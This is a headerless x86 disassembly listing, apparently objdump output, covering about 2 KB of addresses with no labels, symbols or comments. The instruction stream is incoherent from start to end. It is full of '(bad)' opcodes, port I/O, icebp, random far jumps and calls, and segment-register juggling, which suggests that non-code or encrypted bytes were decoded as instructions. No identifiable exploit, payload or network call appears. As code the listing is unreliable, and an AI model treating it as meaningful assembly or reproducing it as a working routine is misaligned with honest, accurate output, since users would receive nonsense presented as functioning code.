  41040a:	xor    BYTE PTR [esi+0x1b],0x6b
  41040e:	aas    
  41040f:	adc    DWORD PTR [edx+0x18],edx
  410412:	cdq    
  410413:	mov    ah,0x3b
  410415:	jne    0x410471
  410417:	add    al,0xb9
  410419:	adc    ebx,DWORD PTR [edx+0x67]
  41041c:	pop    es
  41041d:	fidiv  DWORD PTR [edx]
  41041f:	inc    ebx
  410420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410421:	sbb    ebx,DWORD PTR [eax+0x4b]
  410424:	test   DWORD PTR [ebx+0x23],0xe36901
  41042b:	out    dx,eax
  41042c:	push   ebx
  41042d:	repz pop ds
  41042f:	and    DWORD PTR [ecx-0x4c0ae658],ebp
  410435:	data16 add bl,0xb8
  410439:	pop    ebx
  41043a:	and    cl,cl
  41043c:	repz popf 
  41043e:	or     eax,DWORD PTR [eax]
  410440:	jno    0x410439
  410442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410443:	push   es
  410444:	jmp    0x410429
  410446:	jp     0x410470
  410448:	push   eax
  410449:	outs   dx,DWORD PTR ds:[esi]
  41044a:	lods   eax,DWORD PTR ds:[esi]
  41044b:	cwde   
  41044c:	adc    DWORD PTR [ebx],ebx
  41044e:	cmp    ebp,DWORD PTR [esi]
  410450:	xchg   esp,eax
  410451:	xor    esp,esp
  410453:	push   ebp
  410454:	js     0x41043e
  410456:	mov    cl,0xe5
  410458:	test   eax,esi
  41045a:	punpckhbw mm5,QWORD PTR [esi-0xc]
  41045e:	xchg   ebx,eax
  41045f:	hlt    
  410460:	jae    0x410465
  410462:	ret    0x36aa
  410465:	and    bl,BYTE PTR ds:0xe9b2738d
  41046b:	stos   DWORD PTR es:[edi],eax
  41046c:	inc    ebx
  41046d:	scas   eax,DWORD PTR es:[edi]
  41046e:	push   esi
  41046f:	mov    bl,0x34
  410471:	fild   WORD PTR [edx+0x66]
  410474:	mov    eax,0xeb08c5b0
  410479:	imul   esi,DWORD PTR [ebx],0x68
  41047c:	stos   DWORD PTR es:[edi],eax
  41047d:	mov    eax,ds:0xc26800ae
  410482:	cmc    
  410483:	ret    0xc13e
  410486:	sbb    eax,eax
  410488:	jae    0x410460
  41048a:	jnp    0x4104c0
  41048c:	dec    ebx
  41048d:	mov    DWORD PTR [ecx-0x5d46633a],ebp
  410493:	mov    ebp,0xe370ed8c
  410498:	push   edi
  410499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049a:	enter  0x4da9,0xf7
  41049e:	sbb    DWORD PTR ds:0xaa0222,edx
  4104a4:	or     DWORD PTR [ecx+0x12],ebp
  4104a7:	sbb    dh,BYTE PTR [edx]
  4104a9:	fwait
  4104aa:	in     al,dx
  4104ab:	dec    ebp
  4104ac:	mov    ebp,DWORD PTR [eax+0x58]
  4104af:	xor    DWORD PTR [ecx-0x3d9dc6c1],0xffffff89
  4104b6:	jmp    0x41048f
  4104b8:	enter  0xdfa9,0x23
  4104bc:	pop    ecx
  4104bd:	add    eax,0x870065f3
  4104c2:	inc    ebx
  4104c3:	jecxz  0x4104d7
  4104c5:	dec    eax
  4104c6:	and    eax,0x6598a077
  4104cb:	push   ecx
  4104cc:	out    dx,eax
  4104cd:	or     ah,BYTE PTR [esi-0x31]
  4104d0:	adc    bh,BYTE PTR [ebx]
  4104d2:	fstp   DWORD PTR [esi]
  4104d4:	(bad)  
  4104d5:	xchg   edi,eax
  4104d6:	imul   ebx,DWORD PTR [edi-0x37],0xffffffd2
  4104da:	xlat   BYTE PTR ds:[ebx]
  4104db:	mov    ds:0xa552699,al
  4104e0:	mov    esp,0xed33404c
  4104e5:	ss cs jbe 0x4104e6
  4104e9:	pusha  
  4104ea:	mov    al,ds:0x508fd464
  4104ef:	cmp    cl,BYTE PTR [eax+0x52]
  4104f2:	dec    esi
  4104f3:	aad    0x6e
  4104f5:	(bad)  
  4104f6:	jg     0x410567
  4104f8:	dec    ecx
  4104f9:	das    
  4104fa:	lods   eax,DWORD PTR ds:[esi]
  4104fb:	add    bl,al
  4104fd:	lock add al,BYTE PTR [ebx+eiz*1-0x3e4e2801]
  410505:	repnz adc DWORD PTR [esi+edx*2],0x42
  41050a:	xchg   ecx,eax
  41050b:	inc    esi
  41050c:	clc    
  41050d:	adc    eax,0xbacd4219
  410512:	mov    dh,0x3
  410514:	das    
  410515:	neg    DWORD PTR fs:[ebx-0x12]
  410519:	or     DWORD PTR [ecx+0x2f],0xffffffcc
  41051d:	out    0x46,al
  41051f:	sbb    bh,cl
  410521:	(bad)  
  410522:	repnz lds esi,FWORD PTR [ecx-0x351f8296]
  410529:	pop    esi
  41052a:	nop
  41052b:	and    BYTE PTR [ebp+0x77031e21],ch
  410531:	aad    0x19
  410533:	cmp    ebx,eax
  410535:	aaa    
  410536:	mov    ch,0xa8
  410538:	out    dx,eax
  410539:	icebp  
  41053a:	and    DWORD PTR [ecx],0x9b793f12
  410540:	dec    edi
  410541:	test   eax,0xafa8a524
  410546:	xchg   edi,eax
  410547:	mov    dl,cl
  410549:	adc    eax,0xd2f3942d
  41054e:	fisttp QWORD PTR [edi-0x23]
  410551:	or     ch,BYTE PTR [eax]
  410553:	imul   ecx,DWORD PTR [edi-0x4],0x46c56be9
  41055a:	sahf   
  41055b:	mov    ch,BYTE PTR [ecx]
  41055d:	jnp    0x410574
  41055f:	add    eax,esi
  410561:	push   esi
  410562:	fcomp  DWORD PTR [ebx-0x75fe889]
  410568:	lods   eax,DWORD PTR ds:[esi]
  410569:	xor    BYTE PTR [esi-0x60239b1f],bh
  41056f:	xchg   ebp,eax
  410570:	test   eax,0xbe7b8ce9
  410575:	cld    
  410576:	dec    esp
  410577:	xchg   ebp,eax
  410578:	dec    eax
  410579:	cmc    
  41057a:	mul    edi
  41057c:	lods   al,BYTE PTR ds:[esi]
  41057d:	in     eax,0x3a
  41057f:	ss pop ecx
  410581:	or     DWORD PTR [ecx-0x6],0xc3a18660
  410588:	icebp  
  410589:	sbb    BYTE PTR [edx-0xf],al
  41058c:	cwde   
  41058d:	out    dx,eax
  41058e:	push   edx
  41058f:	jne    0x4105d1
  410591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410592:	pusha  
  410593:	or     dl,bh
  410595:	mov    BYTE PTR [edi+0x6e],0x4b
  410599:	repnz mov ebx,0x1caf773
  41059f:	cdq    
  4105a0:	lods   al,BYTE PTR ds:[esi]
  4105a1:	mov    al,ds:0x5fa8b379
  4105a6:	adc    BYTE PTR [edx],dl
  4105a8:	in     eax,0x1e
  4105aa:	mov    al,0x36
  4105ac:	js     0x410620
  4105ae:	mov    ebp,DWORD PTR [edi]
  4105b0:	cld    
  4105b1:	inc    ecx
  4105b2:	jecxz  0x4105e4
  4105b4:	inc    edx
  4105b5:	cwde   
  4105b6:	int3   
  4105b7:	or     cl,BYTE PTR [esi+0x25ae4fcb]
  4105bd:	fmul   QWORD PTR [esi]
  4105bf:	loopne 0x41055a
  4105c1:	mov    ss,WORD PTR [ecx+0x2187da73]
  4105c7:	push   esp
  4105c8:	adc    dh,ah
  4105ca:	adc    DWORD PTR [ecx+0x65cc089c],ebx
  4105d0:	xlat   BYTE PTR ds:[ebx]
  4105d1:	out    dx,eax
  4105d2:	jg     0x410635
  4105d4:	cmp    al,0x4c
  4105d6:	aad    0x3
  4105d8:	mov    esi,0xd8eb3507
  4105dd:	inc    edx
  4105de:	ss push ebp
  4105e0:	jge    0x410609
  4105e2:	cli    
  4105e3:	cmp    al,0x25
  4105e5:	test   al,0x24
  4105e7:	or     eax,0x76ef65d5
  4105ec:	cmp    ch,BYTE PTR [ebx-0x221c46d2]
  4105f2:	push   cs
  4105f3:	clc    
  4105f4:	mov    ds:0xfffab220,al
  4105f9:	lods   al,BYTE PTR ds:[esi]
  4105fa:	outs   dx,DWORD PTR ds:[esi]
  4105fb:	pop    ds
  4105fc:	mov    ch,0xa8
  4105fe:	push   ebp
  4105ff:	cmp    BYTE PTR [edi],dh
  410601:	mov    ds:0xd59a2b29,al
  410606:	xchg   ebx,eax
  410607:	pop    eax
  410608:	mov    bh,0x5
  41060a:	pusha  
  41060b:	imul   eax,DWORD PTR [ebx+0x4720cdc5],0x7c
  410612:	jne    0x410640
  410614:	jge    0x41061f
  410616:	xor    bh,0xf9
  410619:	jmp    0xab3501d2
  41061e:	cmp    bh,BYTE PTR [edx+0x7c1e05f6]
  410624:	mov    esp,DWORD PTR [ecx+0x5cc7dd3a]
  41062a:	cmp    eax,0xae238d56
  41062f:	jg     0x4105ef
  410631:	les    esi,FWORD PTR [esi+eiz*2-0x40e4fd94]
  410638:	scas   al,BYTE PTR es:[edi]
  410639:	mov    edi,0xb93a9323
  41063e:	ins    DWORD PTR es:[edi],dx
  41063f:	cmp    al,0x1d
  410641:	pop    edx
  410642:	aam    0x1a
  410644:	or     BYTE PTR [eax-0x1bc95b3a],ch
  41064a:	or     BYTE PTR [eax],bl
  41064c:	retf   0x4f09
  41064f:	scas   al,BYTE PTR es:[edi]
  410650:	js     0x41064c
  410652:	cmp    BYTE PTR [ebx+0x2a],dl
  410655:	ins    DWORD PTR es:[edi],dx
  410656:	fistp  QWORD PTR [edx+0x510d1af8]
  41065c:	mov    al,0xac
  41065e:	xor    DWORD PTR [edi+0x41],edi
  410661:	icebp  
  410662:	jg     0x4106a4
  410664:	mov    bl,bh
  410666:	cmc    
  410667:	mov    ebp,ss
  410669:	cs fs dec edi
  41066c:	mov    BYTE PTR [ecx-0x6a31da1f],dl
  410672:	jo     0x4106ee
  410674:	cmove  esi,DWORD PTR [ebx+0x42]
  410678:	pop    es
  410679:	jp     0x4106af
  41067b:	shl    ebx,1
  41067d:	push   ds
  41067e:	adc    esi,DWORD PTR [esi+0x2d9ceb14]
  410684:	mov    BYTE PTR [esi-0x22e18dc],al
  41068a:	xchg   ebp,eax
  41068b:	pop    ebx
  41068c:	xor    DWORD PTR [edx],0x7a
  41068f:	rol    BYTE PTR [esi+0x4a],1
  410692:	shr    BYTE PTR [edi],0x56
  410695:	mov    ds:0xf7f8e4a8,eax
  41069a:	push   es
  41069b:	xor    BYTE PTR [esi],0xa0
  41069e:	pop    ds
  41069f:	cli    
  4106a0:	pop    esp
  4106a1:	xor    DWORD PTR [edx-0x69],edi
  4106a4:	push   esp
  4106a5:	pushf  
  4106a6:	(bad)  
  4106a7:	aas    
  4106a8:	and    BYTE PTR [eax+ecx*8+0x67],al
  4106ac:	(bad)
  4106af:	fst    DWORD PTR [ebx+0x5d]
  4106b2:	inc    ebp
  4106b3:	jno    0x4106e1
  4106b5:	(bad)  
  4106b6:	shl    BYTE PTR [ebp-0x62788d1f],1
  4106bc:	xchg   ecx,eax
  4106bd:	xchg   edx,eax
  4106be:	mov    bl,0x4b
  4106c0:	in     eax,0x3f
  4106c2:	cmp    eax,0x98dd9295
  4106c7:	pushf  
  4106c8:	(bad)  
  4106c9:	clc    
  4106ca:	sahf   
  4106cb:	lahf   
  4106cc:	icebp  
  4106cd:	xchg   ebx,eax
  4106ce:	cmp    bl,cl
  4106d0:	ins    DWORD PTR es:[edi],dx
  4106d1:	jle    0x410738
  4106d3:	xlat   BYTE PTR ds:[ebx]
  4106d4:	ds add edx,edi
  4106d7:	je     0x410670
  4106d9:	int3   
  4106da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106dc:	xor    DWORD PTR [esi+0x3c6e6e83],esi
  4106e2:	sbb    esi,DWORD PTR [ecx]
  4106e4:	sbb    edi,DWORD PTR [edi-0x57890b1b]
  4106ea:	(bad)  
  4106eb:	loope  0x41069e
  4106ed:	lods   eax,DWORD PTR ds:[esi]
  4106ee:	(bad)  [esi-0x66e0eb15]
  4106f4:	mov    eax,0xcce86042
  4106f9:	sahf   
  4106fa:	sub    eax,0x401990d5
  4106ff:	aad    0x2f
  410701:	or     ecx,eax
  410703:	inc    esp
  410704:	(bad)  
  410705:	fcmovnb st,st(4)
  410707:	xchg   BYTE PTR [ecx],bl
  410709:	cmp    BYTE PTR [esi+0x785f84d0],0xd7
  410710:	ret    
  410711:	add    bh,BYTE PTR [ebp+0x4c22fc8c]
  410717:	jno    0x4106a7
  410719:	dec    eax
  41071a:	std    
  41071b:	xor    al,bh
  41071d:	or     DWORD PTR [ebp-0xfd79d9c],0x76
  410724:	lock ins DWORD PTR es:[edi],dx
  410726:	pop    eax
  410727:	add    al,0x13
  410729:	pop    eax
  41072a:	cmp    eax,DWORD PTR [esi+0x7]
  41072d:	xor    al,0x2
  41072f:	lahf   
  410730:	ss jae 0x410758
  410733:	dec    esp
  410734:	cmp    eax,0xd133b7f2
  410739:	xchg   edi,eax
  41073a:	jnp    0x41077d
  41073c:	aas    
  41073d:	mov    al,0x16
  41073f:	mov    esp,0x1a2342d9
  410744:	mov    edx,0x537c0442
  410749:	xor    BYTE PTR [edx-0x5b],0xd1
  41074d:	fwait
  41074e:	or     al,0xb0
  410750:	add    cl,dl
  410752:	fcom   DWORD PTR [eax+0x42b52477]
  410758:	fisttp DWORD PTR [ebx]
  41075a:	fisubr DWORD PTR [esi]
  41075c:	jmp    0x953:0x94176867
  410763:	jmp    0x85dc:0xf4f557c6
  41076a:	fsubr  st,st(1)
  41076c:	cmp    DWORD PTR [eax],ebx
  41076e:	ret    
  41076f:	pop    es
  410770:	popa   
  410771:	aaa    
  410772:	fdivr  DWORD PTR [ecx-0x77]
  410775:	dec    edx
  410776:	dec    edx
  410777:	fsub   st(7),st
  410779:	adc    DWORD PTR [ebx],edi
  41077b:	fstp   TBYTE PTR [edx-0x574021d7]
  410781:	in     al,dx
  410782:	inc    edx
  410783:	add    eax,esi
  410785:	jp     0x4107b6
  410787:	sti    
  410788:	rol    BYTE PTR [eax-0xb2cad32],cl
  41078e:	outs   dx,BYTE PTR ds:[esi]
  41078f:	inc    esi
  410790:	call   0xfaf6:0xca95c5f
  410797:	dec    edx
  410798:	mov    ds,WORD PTR [eax-0x20fd70c7]
  41079e:	out    dx,al
  41079f:	inc    esp
  4107a0:	ja     0x410758
  4107a2:	push   edx
  4107a3:	cmc    
  4107a4:	adc    eax,0xb86d1714
  4107a9:	lods   al,BYTE PTR ds:[esi]
  4107aa:	sub    eax,0xa2b8f9c5
  4107af:	dec    esp
  4107b0:	pop    ebx
  4107b1:	mov    al,0x56
  4107b3:	mov    ebp,0xde204d5
  4107b8:	mov    esp,0x3f59fb7c
  4107bd:	dec    edi
  4107be:	push   edi
  4107bf:	inc    ecx
  4107c0:	lock mov eax,0x18fa41c5
  4107c6:	and    al,0x86
  4107c8:	xchg   DWORD PTR [edi],esp
  4107ca:	shr    DWORD PTR [edx+0x69],cl
  4107cd:	ja     0x4107e4
  4107cf:	and    esi,DWORD PTR [ebp-0x64]
  4107d2:	pop    eax
  4107d3:	cwde   
  4107d4:	cmp    eax,0xe8eae467
  4107d9:	dec    ebx
  4107da:	imul   edx,DWORD PTR [ebp+ebx*1+0x4f9083ad],0x3e864283
  4107e5:	call   0xbca4:0x39250f85
  4107ec:	xchg   BYTE PTR [ebx],cl
  4107ee:	arpl   WORD PTR [edi+edi*2],sp
  4107f1:	mov    bh,0x1e
  4107f3:	aaa    
  4107f4:	in     eax,dx
  4107f5:	or     dl,BYTE PTR [eax-0x45716022]
  4107fb:	(bad)  [edx-0x2a7ed1ff]
  410801:	cmp    eax,0x54999089
  410806:	stc    
  410807:	mov    edi,DWORD PTR [ebp-0x25b3636b]
  41080d:	add    eax,0x973f7939
  410812:	dec    ecx
  410813:	cwde   
  410814:	push   cs
  410815:	ja     0x4107ad
  410817:	int    0xfa
  410819:	adc    al,0x49
  41081b:	std    
  41081c:	inc    ebp
  41081d:	sbb    BYTE PTR [ebx],dh
  41081f:	scas   al,BYTE PTR es:[edi]
  410820:	sub    eax,0x2fb5ff96
  410825:	pop    edx
  410826:	aaa    
  410827:	sub    BYTE PTR [ebp+0x54caad82],dl
  41082d:	hlt    
  41082e:	(bad)  
  41082f:	stos   DWORD PTR es:[edi],eax
  410830:	push   esi
  410831:	test   al,0x69
  410833:	or     BYTE PTR [edx-0x65],bh
  410836:	daa    
  410837:	push   ecx
  410838:	cmp    BYTE PTR [esi-0x17a6b4ec],dl
  41083e:	aaa    
  41083f:	pop    edi
  410840:	mov    cl,0x1c
  410842:	repnz mov tr3,eax
  410846:	fcomp  QWORD PTR [ecx-0x5d]
  410849:	in     al,0xe3
  41084b:	add    DWORD PTR ss:0x142f99c9,0xffffffd1
  410853:	arpl   WORD PTR ds:0x283cd6fd,di
  410859:	sub    ch,BYTE PTR [ecx-0x213f22e5]
  41085f:	jmp    0xa03b:0xcbf1005e
  410866:	cmp    ebx,DWORD PTR [edi+0xc]
  410869:	or     BYTE PTR [edx-0x253a688b],dl
  41086f:	jno    0x410884
  410871:	repz inc edi
  410873:	and    edi,DWORD PTR [edx+eax*1+0x27bb4230]
  41087a:	inc    ebx
  41087b:	mov    bh,0xc0
  41087d:	add    al,0xa3
  41087f:	mov    esi,0x8ec6404f
  410884:	and    dh,BYTE PTR [ebp+0x13]
  410887:	lahf   
  410888:	cmp    eax,0x958aceac
  41088d:	mov    ebx,0xa6c59b05
  410892:	pop    ds
  410893:	pop    ebp
  410894:	dec    ebp
  410895:	ret    
  410896:	cmp    al,0xbb
  410898:	(bad)  
  410899:	cmp    al,0x7f
  41089b:	adc    edx,DWORD PTR [edx-0x5c2d94c2]
  4108a1:	mov    dl,ch
  4108a3:	xor    BYTE PTR [edx],0xb3
  4108a6:	sar    BYTE PTR ds:0x56e137d2,cl
  4108ac:	inc    ebp
  4108ad:	adc    DWORD PTR [ecx],edi
  4108af:	xor    DWORD PTR [edi-0x71b404c5],esi
  4108b5:	(bad)  
  4108b6:	sbb    eax,0xb768a874
  4108bb:	push   esi
  4108bc:	gs jle 0x4108ad
  4108bf:	cmc    
  4108c0:	leave  
  4108c1:	in     eax,dx
  4108c2:	adc    DWORD PTR [ecx-0x20],0xffffffd0
  4108c6:	ret    
  4108c7:	sbb    ah,BYTE PTR [edx]
  4108c9:	push   es
  4108ca:	mov    esi,0x6c70f981
  4108cf:	int3   
  4108d0:	inc    esp
  4108d1:	mov    ebx,0xb3601b3f
  4108d6:	sahf   
  4108d7:	pop    edi
  4108d8:	cs fs push ds
  4108db:	fs push ds
  4108dd:	dec    esi
  4108de:	or     al,0xee
  4108e0:	daa    
  4108e1:	adc    eax,0xa10d989e
  4108e6:	enter  0x586a,0xec
  4108ea:	fisubr DWORD PTR [eax-0x20]
  4108ed:	mov    esp,DWORD PTR [ebx-0x16]
  4108f0:	lods   eax,DWORD PTR ds:[esi]
  4108f1:	push   ss
  4108f2:	mov    ch,0x5c
  4108f4:	inc    ebx
  4108f5:	dec    eax
  4108f6:	cmp    cl,BYTE PTR [edi-0x6c]
  4108f9:	inc    esp
  4108fa:	or     al,dh
  4108fc:	inc    eax
  4108fd:	mov    eax,0x1b75de02
  410902:	leave  
  410903:	ss popa 
  410905:	push   ebx
  410906:	push   ebp
  410907:	jge    0x4108ba
  410909:	xchg   dh,dh
  41090b:	jb     0x410942
  41090d:	xchg   edi,eax
  41090e:	dec    edx
  41090f:	mov    BYTE PTR [ebx+0x5a01cfe9],dh
  410915:	dec    ebx
  410916:	mov    ch,0xaa
  410918:	inc    esi
  410919:	fld    QWORD PTR [eax]
  41091b:	xchg   esp,eax
  41091c:	and    DWORD PTR fs:[edx],ecx
  41091f:	test   eax,0xd209f3d4
  410924:	ins    BYTE PTR es:[edi],dx
  410925:	and    esp,eax
  410927:	fadd   QWORD PTR [esi+0x69]
  41092a:	or     eax,0xfbf0054f
  41092f:	xchg   DWORD PTR [eax],ebp
  410931:	mov    eax,fs:0x635cc172
  410937:	fidiv  WORD PTR [ecx+eiz*1]
  41093a:	push   ss
  41093b:	pop    esi
  41093c:	retf   0x5a3
  41093f:	and    BYTE PTR [edi+0x31107810],0xde
  410946:	adc    eax,0x13216325
  41094b:	jbe    0x41092a
  41094d:	mov    dl,0xe9
  41094f:	cmp    eax,0xadc47a9f
  410954:	push   edx
  410955:	(bad)  
  410956:	cmp    BYTE PTR [ecx],al
  410958:	test   DWORD PTR [esi-0x66],edx
  41095b:	xchg   esp,eax
  41095c:	push   es
  41095d:	adc    BYTE PTR ds:0x19053b0b,dl
  410963:	or     dh,BYTE PTR [ecx]
  410965:	cs ja  0x41095c
  410968:	sar    BYTE PTR [ebp+0x285d6438],0x70
  41096f:	jle    0x410916
  410971:	push   esi
  410972:	or     edx,ebx
  410974:	push   edx
  410975:	mov    eax,0x3d4cafa1
  41097a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41097b:	sbb    DWORD PTR [eax+edx*1+0x50],esi
  41097f:	fisub  WORD PTR [edi-0x62]
  410982:	lea    edx,[edx-0xe6237d]
  410988:	ret    0xa243
  41098b:	lds    ebx,FWORD PTR [esi-0x6a]
  41098e:	or     ah,BYTE PTR [edi+0x44b8fecb]
  410994:	cmp    al,0xd1
  410996:	and    bh,bh
  410998:	and    eax,0x470656a1
  41099d:	inc    edx
  41099e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41099f:	push   es
  4109a0:	loop   0x4109ad
  4109a2:	cli    
  4109a3:	mov    ebp,0x1bc6b583
  4109a8:	out    dx,al
  4109a9:	ja     0x4109e4
  4109ab:	push   esp
  4109ac:	icebp  
  4109ad:	(bad)  
  4109ae:	rol    BYTE PTR [edx+ebp*4],cl
  4109b1:	dec    eax
  4109b2:	or     ch,BYTE PTR [ebp+0x68]
  4109b5:	into   
  4109b6:	cmp    al,ch
  4109b8:	adc    BYTE PTR [ebx+ebp*1-0x21],dh
  4109bc:	cmp    BYTE PTR [esi],bl
  4109be:	cmp    eax,0xfb29b90b
  4109c3:	stos   DWORD PTR es:[edi],eax
  4109c4:	retf   0x2610
  4109c7:	in     al,dx
  4109c8:	(bad)  
  4109ca:	cmp    al,0x85
  4109cc:	iret   
  4109cd:	mov    cl,0xd6
  4109cf:	sbb    edi,0xffffffa5
  4109d2:	ins    BYTE PTR es:[edi],dx
  4109d3:	mov    esp,0x41fc4420
  4109d8:	out    0xb6,eax
  4109da:	hlt    
  4109db:	loope  0x410999
  4109dd:	jmp    0x6509:0x69149a49
  4109e4:	sbb    BYTE PTR [edx+0x498fdab0],0x11
  4109eb:	aas    
  4109ec:	cli    
  4109ed:	aaa    
  4109ee:	xor    BYTE PTR [ebx+ecx*8],ch
  4109f1:	jb     0x4109d2
  4109f3:	mov    bl,0xaf
  4109f5:	push   ss
  4109f6:	and    DWORD PTR [esp+ebx*2-0x1c2af1e0],edx
  4109fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109fe:	aas    
  4109ff:	test   DWORD PTR [esi+ebx*8-0x68],edx
  410a03:	cmc    
  410a04:	repnz int 0xe0
  410a07:	add    DWORD PTR [esp+esi*2-0x4a],0xe6cf0dc7
  410a0f:	and    al,0xcd
  410a11:	sub    ah,BYTE PTR ds:0xd6ec81f7
  410a17:	cmp    edi,edi
  410a19:	retf   
  410a1a:	lahf   
  410a1b:	(bad)  
  410a1c:	fidivr WORD PTR [ebx-0x3e]
  410a1f:	cmp    DWORD PTR [edx],eax
  410a21:	loopne 0x410aa0
  410a23:	and    eax,0x6e14d3db
  410a28:	rol    cl,0x3e
  410a2b:	inc    esp
  410a2c:	or     dl,ah
  410a2e:	xchg   ecx,eax
  410a2f:	mov    dh,BYTE PTR es:[edi-0x26a849c7]
  410a36:	pop    ecx
  410a37:	sahf   
  410a38:	or     BYTE PTR [edi],bl
  410a3a:	push   esi
  410a3b:	sbb    DWORD PTR [edi],eax
  410a3d:	mov    eax,0x4edfaf82
  410a42:	vmaxps xmm2,xmm7,XMMWORD PTR [edi+0x12]
  410a47:	cvtps2pd xmm7,QWORD PTR [edi-0x16]
  410a4b:	adc    BYTE PTR [esi-0x70f3b6a9],bl
  410a51:	jl     0x410a31
  410a53:	out    0x84,al
  410a55:	push   cs
  410a56:	(bad)  
  410a57:	jp     0x410a20
  410a59:	jmp    0x8b9d:0xd3b89e67
  410a60:	rcl    BYTE PTR [edi],cl
  410a62:	add    bh,0xbe
  410a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a66:	ret    0x9cd9
  410a69:	test   BYTE PTR [edi+0x67ba3ad9],cl
  410a6f:	push   edi
  410a70:	jbe    0x410aec
  410a72:	sub    BYTE PTR [ebp-0x1d7547fa],dh
  410a78:	(bad)  
  410a7a:	fadd   DWORD PTR [edi+0x7f]
  410a7d:	js     0x410ac9
  410a7f:	pop    ds
  410a80:	cmc    
  410a81:	sbb    edx,DWORD PTR [ecx+0x4d]
  410a84:	sbb    al,0xb1
  410a86:	aam    0xfd
  410a88:	adc    bl,BYTE PTR [esi]
  410a8a:	ret    0xf900
  410a8d:	dec    ebx
  410a8e:	test   eax,0x76cad68e
  410a93:	push   cs
  410a94:	(bad)  
  410a95:	sub    ebp,DWORD PTR [ebp+0x7b]
  410a98:	add    esi,ecx
  410a9a:	add    eax,0xdc41f761
  410a9f:	(bad)  
  410aa0:	les    ebx,FWORD PTR [esi-0x1ec5a7e5]
  410aa6:	mov    ebx,0xda913ec3
  410aab:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  410aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aae:	mov    dh,0x9
  410ab0:	data16 cs fwait
  410ab3:	add    DWORD PTR ds:0xf49b1ab4,eax
  410ab9:	mov    ebx,0xfbb46a18
  410abf:	jbe    0x410ad9
  410ac1:	adc    al,0x2a
  410ac3:	sub    esi,DWORD PTR [edi]
  410ac5:	mov    ds:0xfe5b98b1,al
  410aca:	xchg   ecx,eax
  410acb:	test   eax,0x7b7570cf
  410ad0:	inc    esi
  410ad1:	jae    0x410b09
  410ad3:	add    BYTE PTR [ebp-0x32],dl
  410ad6:	sbb    bh,dl
  410ad8:	test   DWORD PTR [esi],0x57c20fdb
  410ade:	mov    dh,0xd2
  410ae0:	push   cs
  410ae1:	xchg   DWORD PTR [edx+0x42],edi
  410ae4:	int    0x88
  410ae6:	adc    dh,dh
  410ae8:	xchg   esi,eax
  410ae9:	loopne 0x410ad2
  410aeb:	jno    0x410aaf
  410aed:	mov    bh,0xc6
  410aef:	stos   DWORD PTR es:[edi],eax
  410af0:	aad    0xf9
  410af2:	mov    ecx,0x64517df5
  410af7:	mov    gs:0x198a97b3,al
  410afd:	xor    dl,BYTE PTR [ebx-0x41]
  410b00:	jns    0x410ac3
  410b02:	(bad)  
  410b03:	ins    DWORD PTR es:[edi],dx
  410b04:	sub    bl,BYTE PTR [ebx-0x79cb7d6e]
  410b0a:	outs   dx,DWORD PTR ds:[esi]
  410b0b:	and    DWORD PTR ds:0xb3404319,edi
  410b11:	pop    edx
  410b12:	dec    ebx
  410b13:	shl    DWORD PTR [edi-0x42],cl
  410b16:	mov    al,ds:0x7cf9e6fb
  410b1b:	ins    DWORD PTR es:[edi],dx
  410b1c:	addr16 jb 0x410ad3
  410b1f:	jp     0x410af6
  410b21:	pop    ebp
  410b22:	icebp  
  410b23:	popa   
  410b24:	int    0x14
  410b26:	leave  
  410b27:	enter  0x7c36,0x5b
  410b2b:	repz data16 jg 0x410afe
  410b2f:	fwait
  410b30:	das    
  410b31:	push   eax
  410b32:	mov    edi,0xc198f9d
  410b37:	inc    ecx
  410b38:	arpl   bp,di
  410b3a:	shl    BYTE PTR [ebx+0x43],cl
  410b3d:	add    al,BYTE PTR [ebx]
  410b3f:	gs int 0x10
  410b42:	iret   
  410b43:	sbb    eax,DWORD PTR [edi+0x56]
  410b46:	popa   
  410b47:	adc    eax,0x36d1fa1f
  410b4c:	out    0x37,eax
  410b4e:	xchg   DWORD PTR [edi],esp
  410b50:	xchg   ebp,eax
  410b51:	inc    edx
  410b52:	fs push ss
  410b54:	icebp  
  410b55:	sbb    al,0x12
  410b57:	popf   
  410b58:	jbe    0x410b09
  410b5a:	icebp  
  410b5b:	cmp    DWORD PTR [esi],ebx
  410b5d:	sbb    BYTE PTR [ebx+0x42],bl
  410b60:	ins    BYTE PTR es:[edi],dx
  410b61:	mov    cl,0x22
  410b63:	inc    eax
  410b64:	and    eax,0xdd3b9e1c
  410b69:	in     al,dx
  410b6a:	js     0x410b0d
  410b6c:	xchg   esi,eax
  410b6d:	jbe    0x410af7
  410b6f:	es mov ecx,0x1d4c2156
  410b75:	inc    ebx
  410b76:	sbb    BYTE PTR [ecx+ecx*1],0x95
  410b7a:	pop    ss
  410b7b:	push   cs
  410b7c:	mov    eax,0x234279d7
  410b81:	or     al,0x44
  410b83:	jge    0x410b6c
  410b85:	push   eax
  410b86:	jns    0x410b3c
  410b88:	fwait
  410b89:	xchg   ebx,eax
  410b8a:	aam    0x74
  410b8c:	popf   
  410b8d:	cmp    dl,al
  410b8f:	push   0x2c
  410b91:	mov    al,0x10
  410b93:	rol    DWORD PTR [eax],cl
  410b95:	lock or DWORD PTR [esi+0x75ae8a03],edx
  410b9c:	rcr    BYTE PTR [edx+0x54],0x5b
  410ba0:	inc    ecx
  410ba1:	xchg   esi,eax
  410ba2:	xor    DWORD PTR [ecx-0x14be0ffc],edx
  410ba8:	mov    ebp,DWORD PTR [edi]
  410baa:	scas   eax,DWORD PTR es:[edi]
  410bab:	ss push esp
  410bad:	jb     0x410b87
  410baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb0:	aaa    
  410bb1:	dec    eax
  410bb2:	cld    
  410bb3:	mov    ds:0xf01f5c89,al
  410bb8:	mov    esp,ebp
  410bba:	mov    cl,0x6e
  410bbc:	add    ch,bl
  410bbe:	ins    BYTE PTR es:[edi],dx
  410bbf:	mov    bh,0x10
  410bc1:	add    al,0x95
  410bc3:	leave  
  410bc4:	sahf   
